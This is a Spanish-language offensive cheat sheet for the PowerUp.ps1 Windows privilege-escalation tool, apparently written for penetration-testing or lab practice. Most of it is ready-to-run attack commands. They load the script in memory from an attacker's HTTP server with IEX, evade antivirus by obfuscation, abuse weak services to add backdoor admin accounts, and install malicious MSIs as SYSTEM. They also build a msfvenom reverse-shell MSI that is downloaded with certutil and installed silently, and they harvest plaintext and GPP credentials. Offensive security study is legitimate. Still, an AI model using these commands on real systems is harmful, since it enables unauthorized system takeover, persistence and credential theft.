# PowerUp.ps1

Tags: #Windows #Powershell #PowerUp #PrivEsc #Enumeracion #Servicios #PostExplotacion

## OBJETIVO

- Automatizar la detección de vectores de escalada de privilegios en Windows
- Identificar servicios mal configurados, credenciales expuestas y misconfigs del registro
- Complementar la enumeración manual antes de explotar vectores específicos

## TIPS

1. **Invoke-AllChecks → ejecutarlo siempre al entrar → resumen completo de vectores**
2. **Si AV detecta el script → usar la versión ofuscada o cargar en memoria con IEX**
3. **Cada resultado incluye AbuseFunction → te dice exactamente cómo explotar el vector**
4. **Complementar con winPEAS → PowerUp es más específico para PrivEsc local**
5. **Para ofuscar → ir a línea 2640 → eliminar contenido de la variable $B64Binary**

## RECURSOS

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

---

## 1. TRANSFERIR Y CARGAR EL SCRIPT

```powershell
# Opción 1 → Subir y ejecutar desde disco
❯ upload /ruta/kali/PowerUp.ps1          # Desde evil-winrm
❯ Import-Module .\PowerUp.ps1
❯ Invoke-AllChecks

# Opción 2 → Cargar en memoria desde servidor HTTP (sin tocar disco → más sigiloso)
# En Kali → python3 -m http.server 80
❯ IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PowerUp.ps1')
❯ Invoke-AllChecks

# Opción 3 → Versión ofuscada si AV detecta la normal
❯ Import-Module .\PowerUp_obf.ps1
❯ Invoke-AllChecks
# Para ofuscar → abrir PowerUp.ps1 → línea 2640 → eliminar contenido de $B64Binary
```

---

## 2. ENUMERACIÓN COMPLETA

```powershell
❯ Invoke-AllChecks
# Ejecuta TODOS los checks disponibles → output completo
# Cada resultado incluye: ServiceName, Path, AbuseFunction → cómo explotarlo
# Buscar en el output: CanRestart = True → puedes reiniciar el servicio → explotar ahora

❯ Invoke-AllChecks | Out-File -Encoding ASCII C:\tmp\powerup_results.txt
# Guardar output a archivo → más fácil de revisar
# Transferir a Kali → cat powerup_results.txt
```

---

## 3. CHECKS INDIVIDUALES

### Servicios

```powershell
❯ Get-ServiceUnquoted
# Unquoted Service Path → rutas de servicios con espacios y sin comillas
# Buscar: ModifiablePath → directorio donde puedes escribir el binario falso

❯ Get-ModifiableServiceFile
# Permisos débiles en el ejecutable del servicio → puedes reemplazarlo

❯ Get-ModifiableService
# Permisos débiles en la configuración del servicio → puedes cambiar el binPath

❯ Invoke-ServiceAbuse -Name 'VulnerableService'
# Explotar servicio vulnerable directamente → añade usuario local como admin
# Requiere: CanRestart = True o reinicio manual del sistema

❯ Invoke-ServiceAbuse -Name 'VulnerableService' -Command "net user omar P4ssw0rd /add"
# Ejecutar comando personalizado como SYSTEM vía el servicio
```

### Registro y AlwaysInstallElevated

```powershell
❯ Get-RegistryAlwaysInstallElevated
# Verifica si AlwaysInstallElevated está habilitado en HKCU y HKLM
# Si devuelve True → generar MSI malicioso → instalar como SYSTEM

❯ Write-UserAddMSI
# Genera MSI malicioso que añade usuario al grupo Administrators
# Ejecutar el .msi generado → instala como SYSTEM si AlwaysInstallElevated activo
```

### Credenciales y autologon

```powershell
❯ Get-RegistryAutoLogon
# Busca credenciales de autologon en el registro → contraseña en claro
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

❯ Get-CachedGPPPassword
# Busca contraseñas en archivos XML de Group Policy Preferences cacheados
# Credenciales cifradas con AES → clave conocida → descifrar automáticamente

❯ Get-UnattendedInstallFile
# Busca archivos de instalación desatendida → pueden contener credenciales
# Ubicaciones: C:\unattend.xml, C:\Windows\Panther\Unattend.xml

❯ Get-WebConfig
# Busca credenciales cifradas en web.config de IIS
# Descifra automáticamente las cadenas de conexión cifradas

❯ Get-ApplicationHost
# Busca contraseñas de application pools en applicationHost.config de IIS
```

### PATH y DLL Hijacking

```powershell
❯ Find-PathDLLHijack
# Busca directorios escribibles en el PATH del sistema
# Si hay uno → plantar DLL maliciosa con el nombre que busca un proceso privilegiado
```

### Tareas programadas

```powershell
❯ Get-ModifiableScheduledTaskFile
# Busca tareas programadas cuyo script o ejecutable es modificable
# Si CanRestart o está programada → modificar → esperar ejecución como SYSTEM
```

---

## 4. EXPLOTAR VECTORES ENCONTRADOS

### Servicio vulnerable → añadir usuario admin

```powershell
# PowerUp tiene funciones de abuso integradas

❯ Invoke-ServiceAbuse -Name '<nombre_servicio>'
# Acción por defecto → añade usuario john:Password123! al grupo Administrators

❯ Invoke-ServiceAbuse -Name '<nombre_servicio>' -UserName omar -Password P4ssw0rd
# Especificar usuario y contraseña personalizados

❯ Invoke-ServiceAbuse -Name '<nombre_servicio>' -Command "net localgroup administrators omar /add"
# Comando personalizado ejecutado como SYSTEM
```

### AlwaysInstallElevated → MSI malicioso

```powershell
# Desde PowerUp → generar MSI directamente
❯ Write-UserAddMSI
# Genera UserAdd.msi en el directorio actual
❯ .\UserAdd.msi
# Instala como SYSTEM → crea usuario backdoor

# Más control → generar MSI con msfvenom desde Kali
# En Kali:
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f msi -o evil.msi
❯ python3 -m http.server 80
# En la víctima:
❯ certutil -urlcache -f http://<IP_KALI>/evil.msi C:\tmp\evil.msi
❯ msiexec /quiet /qn /i C:\tmp\evil.msi
```

---

## 5. INTERPRETAR EL OUTPUT DE Invoke-AllChecks

```
ServiceName    → nombre del servicio vulnerable
Path           → ruta del ejecutable → buscar espacio sin comillas
ModifiablePath → directorio donde puedes escribir → para Unquoted Service Path
StartName      → usuario con el que corre el servicio → LocalSystem = SYSTEM
CanRestart     → True → puedes reiniciar el servicio sin esperar reboot
AbuseFunction  → función exacta de PowerUp para explotar el vector → copiar y ejecutar
```

### Insight

- `CanRestart: True` → explotar ahora sin esperar
- `CanRestart: False` → necesitas reiniciar el sistema o esperar un reinicio
- `AbuseFunction` → PowerUp te da el comando exacto → no tienes que buscar nada más

---

## ONE-LINERS MENTALES

- Entrar a máquina Windows → IEX PowerUp → Invoke-AllChecks → revisar AbuseFunction
- CanRestart True + servicio vulnerable → Invoke-ServiceAbuse inmediato
- AlwaysInstallElevated True → Write-UserAddMSI → ejecutar MSI → admin
- Autologon en registro → credenciales en claro → probar en toda la red
- GPP Password → clave AES conocida → contraseña descifrada automáticamente